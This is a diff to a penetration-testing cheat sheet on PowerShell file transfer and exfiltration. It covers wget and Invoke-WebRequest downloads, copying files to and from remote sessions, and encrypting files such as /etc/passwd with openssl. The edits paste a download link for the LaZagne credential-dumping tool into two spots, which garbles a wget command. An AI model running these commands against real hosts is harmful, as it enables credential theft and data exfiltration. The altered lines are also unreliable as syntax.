@@ -88,7 +88,7 @@ PS > copy-item "Target-File" \\IP[:PORT]\shareName\outputName
 ## Invoke-WebRequest
 Alias: `iwr` and `wget`
 ```powershell
-PS > wget <address> -o <outputFile>
+PS > wget <address> -o <outputFile>https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe
 # ... Specify the UseBasicParsing parameter and try again.
 PS > Invoke-WebRequest https://<ip>[:PORT]/file -UseBasicParsing
 ```
@@ -143,7 +143,7 @@ PS > $Session = New-PSSession -ComputerName DATABASE01
 
 Upload to Session
 PS > Copy-Item -Path "Path\to\file" -ToSession $Session -Destination "Path\to\save"
-
+https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe
 PS > Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -FromSession $Session -Destination "C:\" 
 ```
 ## New-PSDrive
@@ -363,7 +363,6 @@ PS > Invoke-AESEncryption -Mode Decrypt -Key "<KEY>" -Path file.bin.aes
 $ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
 $ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
 ```
-
 
 # **Possible pathways after Exfil:**
 
